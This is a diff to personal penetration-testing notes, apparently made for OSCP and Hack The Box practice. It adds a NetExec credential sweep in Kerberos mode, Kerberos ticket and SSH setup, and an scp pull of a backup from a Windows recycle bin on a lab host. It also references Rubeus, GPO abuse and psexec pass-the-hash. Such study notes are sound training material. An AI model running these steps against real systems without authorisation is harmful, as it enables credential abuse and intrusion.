@@ -293,6 +293,14 @@ const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u 
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Custom Details (Kerberos mode)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]' -k`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target
 
 [[5985 5986 WinRM]]
@@ -433,6 +441,29 @@ Transfer [[Rubeus.exe]] into VICTIM TARGET
 Once Creds are obtained, use [[Runas]]
 
 ---
+## NXC Kerberos Ticket
+
+Whenever nxc -k validates, generate a Kerberos Ticket using NXC
+
+```
+netexec smb [domain] -u '[user]' -p '[pw]' -k --generate-krb5-file krb5.conf
+```
+
+```
+sudo cp krb5.conf /etc/krb5.conf
+```
+
+```
+kinit f.frizzle
+```
+
+This will unlock kerberos login through SSH (-k flag to enable kerberos)
+
+```
+ssh -v -o GSSAPIAuthentication=yes -o GSSAPITrustDNS=yes [user]@ip
+```
+
+Note : /etc/hosts must only have 1 domain associated under the IP
 
 ## Hash the Salt
 
@@ -488,9 +519,24 @@ net groups
 
 Any foreign groups, research.
 
+[[GPO Abuse]]
+
 If Azure spotted, try ADSync
 [[Azure Admins Group]]
 [[LAPS]]
+### Check Recycle Bin
+
+```
+cd '$RECYCLE.BIN'
+```
+
+Recycle Bins have two types of files. The ones that start with `$I` store metadata about the file. The `$R` file holds the original content.
+
+Download over the file
+
+```
+scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
+```
 ## Powershell History
 
 MODIFY
@@ -508,8 +554,8 @@ dv.paragraph("```bash\n" + command + "\n```");
 dir -Force
 ```
 
-[[ADCS]]
 
+[[ADCS]]
 
 
 ---
@@ -533,7 +579,6 @@ const command = `impacket-psexec ${discoveredDomain}/Administrator@${ip} -hashes
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
----
 
 ## wmiexec
 
